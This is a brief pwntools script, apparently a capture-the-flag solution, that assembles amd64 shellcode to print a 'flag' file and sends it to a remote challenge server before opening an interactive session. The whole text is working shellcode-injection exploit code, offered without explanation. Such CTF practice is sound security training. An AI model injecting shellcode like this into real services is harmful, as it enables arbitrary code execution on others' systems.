from pwn import *
from Crypto.Util.number import *
shell = asm(shellcraft.amd64.linux.cat("flag"), arch='x86_64')
print(shell)
r = remote("software-20.challs.olicyber.it", 13003)
r.recvuntil(b" ...")
r.sendline(b"a")
r.recvuntil(b": ")
r.sendline(str(len(shell)).encode())
r.recv(1000)
r.send(shell)
r.interactive()